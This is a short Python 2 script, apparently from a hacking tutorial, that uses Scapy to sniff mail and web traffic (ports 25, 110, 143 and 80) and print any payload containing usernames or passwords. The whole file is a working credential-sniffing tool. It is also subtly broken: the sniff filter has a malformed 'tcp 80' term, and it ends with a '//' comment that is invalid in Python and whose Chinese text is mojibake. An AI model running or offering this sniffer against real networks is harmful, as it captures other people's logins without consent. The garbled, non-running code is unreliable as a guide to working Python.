import threading
from scapy.all import *

# our packet callback
def packet_callback(packet):
    
    if packet[TCP].payload:
    
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload

            
# fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp 80",prn=packet_callback,store=0)
//�ʥ]�L�o����(25port�OSMTP�A110port�OPOP3�A143port�OIMAP�A�o��[�W80port��HTTP��w���ʥ]��Ƥ]�i�H�Q�I��)�Ҧ��쪺�F��|��ipacket_callback�̭��A�öǦ^function